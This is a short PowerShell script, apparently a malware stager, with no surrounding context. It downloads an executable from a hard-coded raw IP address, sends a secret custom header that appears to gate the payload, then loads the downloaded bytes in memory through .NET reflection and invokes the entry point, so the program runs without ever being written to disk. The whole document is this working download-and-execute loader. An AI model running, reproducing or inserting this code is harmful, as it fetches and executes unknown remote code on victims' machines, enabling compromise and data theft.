$url = "http://147.45.44.131/infopage/grwsx.exe"

$webClient = New-Object System.Net.WebClient

$headerName = "X-Special-Header"
$headerValue = "qInx8F3tuJDHXgOEfPJjbaipYaSE1mobJ2YRyo2rjNgnVDhJvevN8R2ku8oPCBonhmpzFb2GYqPiLhJq"
$webClient.Headers.Add($headerName, $headerValue)

$fileBytes = $webClient.DownloadData($url)

$assembly = [System.Reflection.Assembly]::Load($fileBytes)

$entryPoint = $assembly.EntryPoint
if ($entryPoint -ne $null) {
    $entryPoint.Invoke($null, @())
}